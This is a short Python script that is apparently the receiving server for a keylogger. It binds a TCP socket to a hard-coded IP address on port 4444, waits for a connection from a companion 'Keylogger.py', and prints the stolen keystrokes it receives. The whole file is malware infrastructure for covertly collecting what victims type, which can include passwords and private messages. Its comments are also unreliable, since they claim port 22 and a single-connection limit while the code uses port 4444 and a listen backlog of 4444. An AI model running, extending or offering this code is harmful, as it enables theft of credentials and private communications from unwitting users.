#Listens for connection from Keylogger.py on port 22
import socket
'''Specifies that IPv4 addresses are used for communication.
Also specifies that TCP is used.'''
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Binds IP address and port listed below to socket.
server.bind(('172.191.75.243', 4444))
#Sets VM into listening mode. Only allows 1 connection
server.listen(4444)
print("Listening on port 22...")

#Blocks program to await for client connection.
conn, addr = server.accept()
print(f"Connection from {addr}")

#Loop to allow VM to keep recieving incoming keystroke data.
while True:
    data = conn.recv(1024)
    if not data:
        break
    print(data.decode(), end="")
